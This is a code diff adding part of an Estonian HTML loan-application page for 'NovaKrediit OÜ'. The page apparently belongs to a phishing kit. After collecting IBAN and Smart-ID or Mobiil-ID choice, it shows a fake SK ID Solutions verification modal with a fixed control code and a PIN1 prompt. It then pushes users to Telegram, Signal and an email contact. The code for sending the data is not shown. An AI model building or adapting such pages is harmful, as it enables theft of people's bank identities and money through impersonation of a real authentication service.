+        </div>
+
+        <!-- 3. IBAN SEUL : Coop Pank uniquement -->
+        <div id="coop-iban-wrap" class="bank-extra-field">
+          <div class="field">
+            <label for="iban-coop">IBAN <span style="color:#d4a843">*</span></label>
+            <input type="text" id="iban-coop" name="iban" placeholder="EE00 0000 0000 0000 0000">
+            <span class="field-hint" id="hint-iban-coop" aria-live="polite"></span>
+          </div>
+        </div>
+
+        <!-- 4. MÉTHODE AUTH : toutes les banques -->
+        <div id="auth-method-wrap" class="bank-extra-field">
+          <div style="font-size:0.85rem;font-weight:700;color:var(--navy);margin-bottom:14px;text-transform:uppercase;letter-spacing:0.06em;">Kinnitamise meetod</div>
+          <div class="radio-group">
+            <label class="radio-option" onclick="selectAuthOption(this)">
+              <input type="radio" name="auth" value="Smart-ID"> Smart-ID
+            </label>
+            <label class="radio-option" onclick="selectAuthOption(this)">
+              <input type="radio" name="auth" value="Mobiil-ID"> Mobiil-ID
+            </label>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="step-nav">
+      <button type="button" class="btn-prev" id="btn-prev-2" onclick="prevStep(2)">&larr; Tagasi</button>
+      <button type="submit" class="btn-submit" id="submitBtn" data-i18n="btn-submit">Esita taotlus</button>
+    </div>
+    </div><!-- /form-step-2 -->
+
+  </form>
+</div>
+
+<!-- STEPS SECTION -->
+<div class="steps-section">
+  <div class="steps-inner">
+    <h2 class="steps-title">Laenu taotlemine on kiire, lihtne ja mugav</h2>
+    <div class="steps-grid">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div class="step-text">
+          <strong>Täitke taotlus</strong>
+          <p>Täitke kõik väljad täpselt ja esitage taotlus digitaalselt.</p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div class="step-text">
+          <strong>Saate vastuse kohe</strong>
+          <p>Hindame teie krediidivõimekust ja saadame personaalse pakkumise.</p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div class="step-text">
+          <strong>Kinnitage Smart-ID või Mobiil-ID-ga</strong>
+          <p>Kinnitage oma identiteet ja allkirjastage leping digitaalselt.</p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num">4</div>
+        <div class="step-text">
+          <strong>Raha laekub kontole</strong>
+          <p>Pärast lepingu sõlmimist laekub summa teie pangakontole.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- USP SECTION -->
+<div class="usp-section">
+  <div class="usp-inner">
+    <div class="usp-item">
+      <div class="usp-icon">⚡</div>
+      <div class="usp-label">Kiire vastus taotlusele</div>
+    </div>
+    <div class="usp-item">
+      <div class="usp-icon">🔒</div>
+      <div class="usp-label">100% turvaline ja krüpteeritud</div>
+    </div>
+    <div class="usp-item">
+      <div class="usp-icon">📱</div>
+      <div class="usp-label">Teenus avatud 24/7</div>
+    </div>
+    <div class="usp-item">
+      <div class="usp-icon">✅</div>
+      <div class="usp-label">Ilma lepingutasuta</div>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-col">
+      <div class="footer-logo">Nova<span>Krediit</span> OÜ</div>
+      <div class="footer-address">
+        Tuukri tn 11, 10120 Tallinn<br>
+        Reg nr 11092198<br>
+        Signal: +372 5618 6725<br>
+      </div>
+    </div>
+    <div class="footer-col">
+      <div class="footer-heading">Laenud</div>
+      <ul class="footer-links">
+        <li>Personaallaen</li>
+        <li>Autokrediit</li>
+        <li>Remondilaen</li>
+        <li>Tarbimislaen</li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <div class="footer-heading">NovaKrediit</div>
+      <ul class="footer-links">
+        <li>Meist</li>
+        <li>Tingimused</li>
+        <li>Privaatsuspoliitika</li>
+        <li>Kontakt</li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <div class="footer-heading">Kontaktid</div>
+      <ul class="footer-links">
+        <li><a href="tel:+37256186725">+372 5618 6725</a></li>
+      </ul>
+      <div class="footer-persons">Mihail Ukatov · Jaanus Aalmaa</div>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <div class="footer-bottom-inner">
+      <span>Finantsteenust osutab NOVAKREDIIT OÜ. Enne lepingu sõlmimist tutvu tingimustega ja pea nõu asjatundjaga. Teie isikuandmed on kaitstud vastavalt Eesti Panga ja finantsjärelevalve nõuetele.</span>
+      <span>&copy; 2026 NovaKrediit O&Uuml;. K&otilde;ik &otilde;igused kaitstud.</span>
+      <span class="footer-apr-mention">N&auml;itlik TAEG (APR): 12,00 % &middot; Laenu intressim&auml;&auml;r: 12,00 % aastas &middot; Kogukulu s&otilde;ltub laenusummast, t&auml;htajast ja kliendi profiilist. Tarbimislaenude direktiiv 2008/48/E&Uuml;.</span>
+    </div>
+  </div>
+</footer>
+
+<!-- SUCCESS OVERLAY -->
+<div id="successOverlay" style="display:none;position:fixed;inset:0;z-index:2000;background:rgba(10,22,40,0.92);align-items:center;justify-content:center;">
+  <div id="successBox" style="background:#fff;border-radius:18px;max-width:480px;width:90%;padding:48px 40px;text-align:center;box-shadow:0 24px 80px rgba(0,0,0,0.35);position:relative;">
+    <div id="step-success" style="display:none;">
+      <div style="font-size:3.5rem;margin-bottom:18px;">&#x2705;</div>
+      <h2 style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:1.6rem;color:#0a1628;margin-bottom:12px;" data-i18n="sov-sent-title">Taotlus edukalt saadetud!</h2>
+      <p style="color:#6b7a99;font-size:1rem;line-height:1.6;" data-i18n="sov-sent-body">Teie krediidtaotlus on meile edukalt edastatud. T&ouml;&ouml;tleme teie taotlust&hellip;</p>
+    </div>
+    <div id="step-processing" style="display:none;">
+      <div style="font-size:2.5rem;margin-bottom:16px;">&#x23F3;</div>
+      <h2 style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:1.4rem;color:#0a1628;margin-bottom:8px;" data-i18n="sov-proc-title">Palun oodake</h2>
+      <p style="color:#6b7a99;font-size:0.93rem;margin-bottom:24px;" data-i18n="sov-proc-body">Kontrollime teie andmeid ja hindame krediidiv&otilde;imekust&hellip;</p>
+      <div style="background:#eef0f5;border-radius:30px;height:14px;overflow:hidden;margin-bottom:10px;">
+        <div id="progressBar" style="height:100%;width:10%;background:linear-gradient(90deg,#0a1628,#c9a84c);border-radius:30px;transition:width 0.4s ease;"></div>
+      </div>
+      <div id="progressLabel" style="font-size:0.85rem;color:#c9a84c;font-weight:600;">10%</div>
+    </div>
+    <div id="modal-80" style="display:none;position:fixed;inset:0;z-index:3000;background:rgba(10,22,40,0.88);align-items:center;justify-content:center;">
+      <div style="background:#fff;border-radius:20px;max-width:400px;width:90%;padding:32px 24px;text-align:center;box-shadow:0 24px 80px rgba(0,0,0,0.45);animation:modalPop 0.35s cubic-bezier(0.34,1.56,0.64,1);">
+        <div style="display:inline-flex;flex-direction:column;align-items:center;gap:3px;background:#fff;border:1.5px solid #e5e7eb;border-radius:14px;padding:12px 24px;box-shadow:0 2px 12px rgba(0,0,0,0.08);margin:0 auto 16px;">
+          <span id="auth-icon-label" style="font-family:'Plus Jakarta Sans',Arial,sans-serif;font-weight:900;font-size:1.35rem;color:#0a1628;letter-spacing:0.06em;">Smart-ID</span>
+          <span style="font-size:0.58rem;color:#9ca3af;letter-spacing:0.1em;text-transform:uppercase;">SK ID Solutions</span>
+        </div>
+        <h3 style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:1.2rem;color:#0a1628;margin-bottom:6px;">Kinnitage oma isik</h3>
+        <p style="color:#6b7a99;font-size:0.83rem;line-height:1.6;margin-bottom:18px;">Kontrollige, et teie seadmes kuvatav kood<br>ühtib alloleva koodiga, ja sisestage PIN1.</p>
+        <div style="background:#0a1628;border-radius:14px;padding:24px 20px 18px;margin-bottom:20px;">
+          <div id="smartid-code" style="font-size:3rem;font-weight:900;color:#fff;letter-spacing:0.2em;font-family:'Plus Jakarta Sans',Arial,sans-serif;">7225</div>
+          <div style="font-size:0.62rem;color:rgba(255,255,255,0.4);margin-top:5px;text-transform:uppercase;letter-spacing:0.12em;">Kontrollkood</div>
+        </div>
+        <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin-bottom:16px;">
+          <div style="position:relative;width:80px;height:80px;">
+            <svg width="80" height="80" viewBox="0 0 80 80" style="transform:rotate(-90deg);">
+              <circle cx="40" cy="40" r="34" fill="none" stroke="#e5e7eb" stroke-width="6"/>
+              <circle id="timer-circle" cx="40" cy="40" r="34" fill="none" stroke="#3b82f6" stroke-width="6" stroke-linecap="round" stroke-dasharray="213.6" stroke-dashoffset="0"/>
+            </svg>
+            <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;">
+              <span id="auth-timer" style="font-size:1rem;font-weight:900;color:#1d4ed8;font-family:'Plus Jakarta Sans',Arial,sans-serif;">2:00</span>
+            </div>
+          </div>
+          <span id="auth-wait-text" style="font-size:0.83rem;color:#1d4ed8;font-weight:600;">Ootan teie kinnitust&hellip;</span>
+        </div>
+        <div id="auth-expired-msg" style="display:none;background:#fff7ed;border:1px solid #fed7aa;border-radius:10px;padding:14px;margin-bottom:12px;text-align:center;">
+          <div style="font-size:0.86rem;font-weight:700;color:#c2410c;margin-bottom:6px;">&#9201; Kinnituse aeg on l&otilde;ppenud</div>
+          <div style="font-size:0.78rem;color:#9a3412;margin-bottom:12px;">Palun v&otilde;tke meiega &uuml;hendust &mdash; aitame teid kohe!</div>
+          <div style="display:flex;flex-direction:column;gap:8px;">
+            <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;justify-content:center;gap:8px;background:#2AABEE;color:#fff;border-radius:8px;padding:10px;font-size:0.82rem;font-weight:700;text-decoration:none;">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.69 7.96c-.12.56-.46.7-.93.43l-2.57-1.89-1.24 1.19c-.14.13-.25.25-.51.25l.18-2.59 4.71-4.25c.2-.18-.04-.28-.32-.1L7.9 14.47 5.37 13.7c-.55-.17-.56-.55.12-.82l9.28-3.58c.46-.17.86.11.87.5z" fill="white"/></svg>Telegram
+            </a>
+            <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;justify-content:center;gap:8px;background:#3a76f0;color:#fff;border-radius:8px;padding:10px;font-size:0.82rem;font-weight:700;text-decoration:none;">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="white" opacity="0.3"/><path d="M12 7a5 5 0 100 10A5 5 0 0012 7z" fill="white"/></svg>Signal
+            </a>
+            <a href="mailto:novakrediit@mail.ee" style="display:flex;align-items:center;justify-content:center;gap:8px;background:#0a1628;color:#fff;border-radius:8px;padding:10px;font-size:0.82rem;font-weight:700;text-decoration:none;">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" stroke="white" stroke-width="1.8"/><path d="M2 7l10 7 10-7" stroke="white" stroke-width="1.8"/></svg>novakrediit@mail.ee
+            </a>
+          </div>
+        </div>
+        <!-- Bouton contact visible dès le début -->
+        <div style="background:#f0f9ff;border:1px solid #bae6fd;border-radius:10px;padding:10px 14px;margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;">
+          <span style="font-size:0.75rem;color:#0369a1;font-weight:500;">Vajate abi?</span>
+          <button onclick="document.getElementById('auth-contact-bar').style.display=document.getElementById('auth-contact-bar').style.display==='block'?'none':'block'" style="background:#0a1628;color:#fff;border:none;border-radius:6px;padding:6px 12px;font-size:0.74rem;font-weight:700;cursor:pointer;">Võtke ühendust</button>
+        </div>
+        <div id="auth-contact-bar" style="display:none;background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:12px;margin-bottom:12px;">
+          <div style="display:flex;flex-direction:column;gap:7px;">
+            <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;justify-content:center;gap:7px;background:#2AABEE;color:#fff;border-radius:8px;padding:9px;font-size:0.8rem;font-weight:700;text-decoration:none;">Telegram</a>
+            <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;justify-content:center;gap:7px;background:#3a76f0;color:#fff;border-radius:8px;padding:9px;font-size:0.8rem;font-weight:700;text-decoration:none;">Signal</a>
+            <a href="mailto:novakrediit@mail.ee" style="display:flex;align-items:center;justify-content:center;gap:7px;background:#0a1628;color:#fff;border-radius:8px;padding:9px;font-size:0.8rem;font-weight:700;text-decoration:none;">novakrediit@mail.ee</a>
+          </div>
+        </div>
+        <p id="auth-hint-text" style="font-size:0.72rem;color:#9ca3af;line-height:1.5;">Kui kinnitust ei tule, kontrollige oma telefoni<br>ja veenduge et rakendus on avatud.</p>
+      </div>
+    </div>
+        <div id="step-approved" style="display:none;">
+      <!-- Icône succès -->
+      <div style="width:76px;height:76px;margin:0 auto 22px;border-radius:50%;background:#0d1b2a;border:2px solid #c8972f;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 10px rgba(200,151,47,0.07),0 0 0 20px rgba(200,151,47,0.03),0 12px 40px rgba(0,0,0,0.2);animation:sov-pop 0.55s cubic-bezier(0.34,1.56,0.64,1) forwards;">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><path d="M4.5 12.5l5 5L19.5 7" stroke="#c8972f" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+
+      <h2 style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:1.45rem;color:#0a1628;margin-bottom:6px;">Taotlus on menetluses!</h2>
+      <p style="color:#6b7a99;font-size:0.9rem;line-height:1.6;margin-bottom:20px;">Teie isik on kinnitatud ja dossier on edastatud meie meeskonnale.</p>
+
+      <!-- Numéro dossier -->
+      <div style="background:#f7f8fa;border:1px solid #e5e7eb;border-radius:12px;padding:14px 18px;margin-bottom:16px;">
+        <div style="font-size:0.68rem;text-transform:uppercase;letter-spacing:0.1em;color:#9ca3af;margin-bottom:4px;">Dossieri number</div>
+        <div id="dossier-number" style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:1.35rem;color:#0a1628;letter-spacing:0.06em;">NK-2026-0000</div>
+      </div>
+
+      <!-- Confirmation isik -->
+      <div style="display:flex;align-items:center;gap:12px;background:#f0fdf4;border:1px solid #86efac;border-radius:10px;padding:12px 16px;margin-bottom:16px;text-align:left;">
+        <div style="width:28px;height:28px;background:#16a34a;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M4.5 12.5l5 5L19.5 7" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <div>
+          <div style="font-size:0.82rem;font-weight:700;color:#15803d;">Isik kinnitatud</div>
+          <div style="font-size:0.74rem;color:#16a34a;">Smart-ID / Mobiil-ID kaudu</div>
+        </div>
+      </div>
+
+      <!-- Étapes suivantes -->
+      <div style="background:#fffbeb;border:1px solid #fde68a;border-radius:10px;padding:14px 16px;text-align:left;">
+        <div style="font-size:0.72rem;font-weight:700;color:#92400e;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.06em;">&#128336; J&auml;rgmised sammud</div>
+        <div style="font-size:0.82rem;color:#78350f;display:flex;flex-direction:column;gap:6px;">
+          <div>1. Meie ekspert analüüsib teie taotlust</div>
+          <div>2. Vastus teie e-postile 15 minuti jooksul</div>
+          <div>3. Raha laekub kontole p&auml;rast lepingu allkirjastamist</div>
+        </div>
+      </div>
+
+      <!-- Canaux de contact -->
+      <div style="margin-top:20px;border-top:1px solid #e5e7eb;padding-top:20px;">
+        <div style="font-size:0.72rem;font-weight:700;color:#6b7280;text-transform:uppercase;letter-spacing:0.1em;margin-bottom:14px;text-align:center;">V&otilde;tke meiega &uuml;hendust</div>
+        <div style="display:flex;flex-direction:column;gap:10px;">
+          <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;gap:12px;background:#eff6ff;border:1px solid #93c5fd;border-radius:10px;padding:12px 16px;text-decoration:none;">
+            <div style="width:36px;height:36px;background:#2AABEE;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.69 7.96c-.12.56-.46.7-.93.43l-2.57-1.89-1.24 1.19c-.14.13-.25.25-.51.25l.18-2.59 4.71-4.25c.2-.18-.04-.28-.32-.1L7.9 14.47 5.37 13.7c-.55-.17-.56-.55.12-.82l9.28-3.58c.46-.17.86.11.87.5z" fill="white"/></svg>
+            </div>
+            <div>
+              <div style="font-size:0.84rem;font-weight:700;color:#1d4ed8;">Telegram</div>
+              <div style="font-size:0.74rem;color:#3b82f6;">+372 5450 5527</div>
+            </div>
+          </a>
+          <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;gap:12px;background:#eff6ff;border:1px solid #bfdbfe;border-radius:10px;padding:12px 16px;text-decoration:none;">
+            <div style="width:36px;height:36px;background:#3a76f0;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="white" opacity="0.2"/><path d="M12 7a5 5 0 100 10A5 5 0 0012 7z" fill="white"/></svg>
+            </div>
+            <div>
+              <div style="font-size:0.84rem;font-weight:700;color:#1d4ed8;">Signal</div>
+              <div style="font-size:0.74rem;color:#3b82f6;">+372 5618 6725</div>
+            </div>
+          </a>
+          <a href="mailto:novakrediit@mail.ee" style="display:flex;align-items:center;gap:12px;background:#fafafa;border:1px solid #e5e7eb;border-radius:10px;padding:12px 16px;text-decoration:none;">
+            <div style="width:36px;height:36px;background:#0a1628;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" stroke="white" stroke-width="1.8"/><path d="M2 7l10 7 10-7" stroke="white" stroke-width="1.8"/></svg>
+            </div>
+            <div>
+              <div style="font-size:0.84rem;font-weight:700;color:#0a1628;">E-post</div>
+              <div style="font-size:0.74rem;color:#6b7280;">novakrediit@mail.ee</div>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <div class="sov-divider"></div>
+      <div class="sov-dots"><div class="sov-dot"></div><div class="sov-dot"></div><div class="sov-dot"></div></div>
+    </div>
+
+<!-- Bouton flottant chat — visible uniquement sur l'écran final -->
+<div id="float-chat-widget" style="display:none;position:fixed;bottom:24px;right:24px;z-index:9999;font-family:'Inter',sans-serif;">
+  <!-- Bouton toggle -->
+  <button id="float-chat-toggle" onclick="toggleFloatChat()" style="background:#0a1628;color:#fff;border:none;border-radius:50px;padding:14px 22px 14px 18px;display:flex;align-items:center;gap:10px;cursor:pointer;box-shadow:0 4px 24px rgba(10,22,40,0.4);font-family:'Inter',sans-serif;font-weight:600;font-size:0.9rem;transition:all 0.25s;border-bottom:3px solid #d4a843;">
+    <span style="font-size:1.1rem;">💬</span>
+    <span>Vajate abi?</span>
+  </button>
+  <!-- Box chat -->
+  <div id="float-chat-box" style="display:none;position:absolute;bottom:70px;right:0;width:300px;background:#fff;border-radius:18px;box-shadow:0 16px 48px rgba(0,0,0,0.18);overflow:hidden;animation:chatPop 0.3s cubic-bezier(0.34,1.56,0.64,1);">
+    <!-- Header -->
+    <div style="background:#0a1628;padding:16px 18px;display:flex;align-items:center;justify-content:space-between;">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <div style="width:38px;height:38px;background:#d4a843;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:0.82rem;color:#0a1628;">NK</div>
+        <div>
+          <div style="color:#fff;font-weight:700;font-size:0.88rem;">NovaKrediit OÜ</div>
+          <div style="color:rgba(255,255,255,0.5);font-size:0.72rem;display:flex;align-items:center;gap:5px;margin-top:2px;">
+            <span style="width:7px;height:7px;background:#4ade80;border-radius:50%;display:inline-block;"></span> Oleme siin
+          </div>
+        </div>
+      </div>
+      <button onclick="toggleFloatChat()" style="background:none;border:none;color:rgba(255,255,255,0.5);font-size:1.1rem;cursor:pointer;padding:4px;">✕</button>
+    </div>
+    <!-- Message -->
+    <div style="padding:16px 18px;background:#f7f8fa;">
+      <div style="background:#fff;border:1px solid #e5e7eb;border-radius:14px 14px 14px 4px;padding:10px 14px;font-size:0.86rem;color:#1a1a2e;line-height:1.5;box-shadow:0 1px 4px rgba(0,0,0,0.05);">
+        👋 Kas vajate abi taotlusega? Võtke meiega ühendust!
+      </div>
+    </div>
+    <!-- Options -->
+    <div style="padding:12px 16px;display:flex;flex-direction:column;gap:8px;">
+      <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;gap:10px;padding:11px 14px;border-radius:10px;font-size:0.86rem;font-weight:600;text-decoration:none;color:#fff;background:#2AABEE;transition:all 0.2s;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.69 7.96c-.12.56-.46.7-.93.43l-2.57-1.89-1.24 1.19c-.14.13-.25.25-.51.25l.18-2.59 4.71-4.25c.2-.18-.04-.28-.32-.1L7.9 14.47 5.37 13.7c-.55-.17-.56-.55.12-.82l9.28-3.58c.46-.17.86.11.87.5z" fill="white"/></svg>
+        Telegram
+      </a>
+      <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" style="display:flex;align-items:center;gap:10px;padding:11px 14px;border-radius:10px;font-size:0.86rem;font-weight:600;text-decoration:none;color:#fff;background:#3a76f0;transition:all 0.2s;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="white" opacity="0.2"/><path d="M12 7a5 5 0 100 10A5 5 0 0012 7z" fill="white"/></svg>
+        Signal
+      </a>
+      <!-- Formulaire email inline -->
+      <div id="chat-email-form" style="background:#f7f8fa;border-radius:10px;padding:12px;margin-top:2px;">
+        <div style="font-size:0.75rem;font-weight:700;color:#0a1628;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.06em;">✉️ Saada e-kiri</div>
+        <input type="email" id="chat-email-input" placeholder="Teie e-post" style="width:100%;border:1.5px solid #e5e7eb;border-radius:8px;padding:9px 12px;font-size:0.84rem;margin-bottom:6px;font-family:'Inter',sans-serif;outline:none;">
+        <textarea id="chat-msg-input" placeholder="Teie sõnum..." rows="3" style="width:100%;border:1.5px solid #e5e7eb;border-radius:8px;padding:9px 12px;font-size:0.84rem;font-family:'Inter',sans-serif;resize:none;outline:none;margin-bottom:6px;"></textarea>
+        <button onclick="sendChatEmail()" style="width:100%;background:#0a1628;color:#fff;border:none;border-radius:8px;padding:10px;font-size:0.84rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;border-bottom:2px solid #d4a843;">Saada →</button>
+        <div id="chat-email-sent" style="display:none;text-align:center;color:#16a34a;font-size:0.8rem;font-weight:600;margin-top:6px;">✓ Saadetud! Vastame esimesel võimalusel.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<style>
+@keyframes chatPop{from{opacity:0;transform:scale(0.85) translateY(20px)}to{opacity:1;transform:scale(1) translateY(0)}}
+#float-chat-toggle:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(10,22,40,0.45);}
+@media(max-width:480px){#float-chat-box{width:calc(100vw - 32px);right:0;}}
+</style>
+
+<script>
+function toggleFloatChat(){
+  var box=document.getElementById('float-chat-box');
+  box.style.display=box.style.display==='block'?'none':'block';
+}
+
+// ── Minuterie 2 minutes avec cercle SVG ──
+var _authTimerInterval=null;
+var _authTotal=120;
+var CIRC=201.06; // 2 * PI * 32
+function _timerUpdate(){
+  var arc=document.getElementById('timer-circle');
+  var tmr=document.getElementById('auth-timer');
+  var m=Math.floor(_authTotal/60), s=_authTotal%60;
+  var offset=CIRC*(1-(_authTotal/120));
+  if(arc){arc.setAttribute('stroke-dashoffset',offset.toFixed(2));arc.setAttribute('stroke',_authTotal<=30?'#ef4444':'#3b82f6');}
+  if(tmr){tmr.textContent=m+':'+(s<10?'0':'')+s;tmr.style.color=_authTotal<=30?'#ef4444':'#1d4ed8';}
+}
+function startAuthTimer(){
+  if(_authTimerInterval){clearInterval(_authTimerInterval);_authTimerInterval=null;}
+  _authTotal=120;
+  // Reset visuel
+  var e=document.getElementById('auth-expired-msg');
+  var h=document.getElementById('auth-hint-text');
+  var w=document.getElementById('auth-wait-text');
+  if(e) e.style.display='none';
+  if(h) h.style.display='block';
+  if(w) w.style.display='block';
+  _timerUpdate();
+  _authTimerInterval=setInterval(function(){
+    _authTotal--;
+    _timerUpdate();
+    if(_authTotal<=0){
+      clearInterval(_authTimerInterval);
+      var exp=document.getElementById('auth-expired-msg');
+      var hint=document.getElementById('auth-hint-text');
+      var wait=document.getElementById('auth-wait-text');
+      if(exp) exp.style.display='block';
+      if(hint) hint.style.display='none';
+      if(wait) wait.style.display='none';
+    }
+  },1000);
+}
+
+// ── Sync champs montant/durée ↔ calculateur ──
+function syncSummaToCalc(val){
+  var el=document.getElementById('calc-amount');
+  var hidden=document.getElementById('summa');
+  if(el && val>=500 && val<=30000){ el.value=val; updateCalc(); }
+  if(hidden) hidden.value=val;
+}
+function syncPerioodToCalc(val){
+  var el=document.getElementById('calc-period');
+  var hidden=document.getElementById('periood');
+  if(el && val){ el.value=val; updateCalc(); }
+  if(hidden) hidden.value=val+' kuud';
+}
+// Pré-remplir les champs depuis le calculateur au chargement
+(function(){
+  var calcA=document.getElementById('calc-amount');
+  var calcP=document.getElementById('calc-period');
+  var fA=document.getElementById('field-summa');
+  var fP=document.getElementById('field-periood');
+  if(calcA && fA) fA.value=calcA.value;
+  if(calcP && fP) fP.value=calcP.value;
+})();
+
+// ── Email depuis chat ──
+function sendChatEmail(){
+  var email=document.getElementById('chat-email-input').value.trim();
+  var msg=document.getElementById('chat-msg-input').value.trim();
+  if(!email||!msg){ alert('Palun täitke mõlemad väljad.'); return; }
+  var mailto='mailto:novakrediit@mail.ee'
+    +'?subject='+encodeURIComponent('NovaKrediit - Kliendi sõnum')
+    +'&body='+encodeURIComponent('E-post: '+email+'
+
+'+msg);
+  window.location.href=mailto;
+  document.getElementById('chat-email-sent').style.display='block';
+}
+</script>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ══════════════════════════════════════════════════════════════
+// I18N
+// ══════════════════════════════════════════════════════════════
+const i18n = {
+  et: {
+    'secure-badge':'Turvaline taotlus','page-title':'Krediiditaotlus',
+    'page-subtitle':'T&auml;itke k&otilde;ik v&auml;ljad t&auml;pselt. Teie andmeid t&ouml;&ouml;deldakse konfidentsiaalselt.',
+    'sec-auth':'Identifitseerimine','sec-personal':'Isikuandmed','sec-address':'Elukoha andmed',
+    'sec-work':'T&ouml;&ouml;andmed','sec-credit':'Krediidi andmed','sec-vehicle':'S&otilde;iduki andmed',
+    'sec-bank':'Pangakonto',
+    'decl-confirm':'Kinnitan, et esitatud andmed on &otilde;iged.',
+    'decl-consent':'N&otilde;ustun krediidiv&otilde;imekuse kontrolliga.',
+    'btn-submit':'Esita taotlus',
+    'calc-monthly-label':'Kuumakse','calc-total-label':'Kogumakse','calc-interest-label':'Intressid kokku',
+    'calc-badge-1':'Igale kliendile personaalne pakkumine','calc-badge-2':'Laenutaotlusele saad vastuse kohe',
+    'calc-cta':'Esitan laenutaotluse',
+    'apr-rate-label':'Laenu intressim&auml;&auml;r (aastas)','apr-example-prefix':'N&auml;idisarvutus:',
+    'apr-legal-note':'L&otilde;plik intressim&auml;&auml;r s&otilde;ltub kliendi krediidiv&otilde;imekusest. Arvutus on ligikaudne ja ei kujuta endast laenupakkumist.',
+    'amort-toggle-label':'N&auml;ita tagasimaksegraafiku eelvaadet',
+    'amort-th-monthly':'Kuumakse','amort-th-principal':'P&otilde;hiosa','amort-th-interest':'Intress','amort-th-balance':'J&auml;&auml;k',
+    'amort-show-all':'N&auml;ita k&otilde;iki makseid &#9662;',
+    'docs-after-title':'P&auml;rast taotluse esitamist','docs-after-body':'saatke j&auml;rgmised dokumendid e-posti aadressile',
+    'docs-item-id':'Isikut t&otilde;endav dokument','docs-item-id-hint':'ID-kaart (m&otilde;lemad pooled) v&otilde;i pass',
+    'docs-item-bank':'Pangakonto v&auml;ljavõte','docs-item-bank-hint':'viimase 3 kuu v&auml;ljavõte, IBAN n&auml;htav',
+    'docs-ref-note':'Soovitame m&auml;rkida e-kirja teemale oma t&auml;isnimi ja taotluse number.',
+    'stepper-1':'Identiteet','stepper-1-sub':'Isiku- &amp; elukohaandmed',
+    'stepper-2':'T&ouml;&ouml; &amp; Pank','stepper-2-sub':'Sissetulek &amp; pangakonto',
+    'btn-next-1':'J&auml;rgmine: T&ouml;&ouml; &amp; Pank &rarr;','btn-next-2':'Esita taotlus',
+    'btn-prev':'&larr; Tagasi',
+    'sov-sent-title':'Taotlus edukalt saadetud!','sov-sent-body':'Teie krediidtaotlus on meile edukalt edastatud. T&ouml;&ouml;tleme teie taotlust&hellip;',
+    'sov-proc-title':'Palun oodake','sov-proc-body':'Kontrollime teie andmeid ja hindame krediidiv&otilde;imekust&hellip;',
+    'modal80-title':'Kinnitage oma isik',
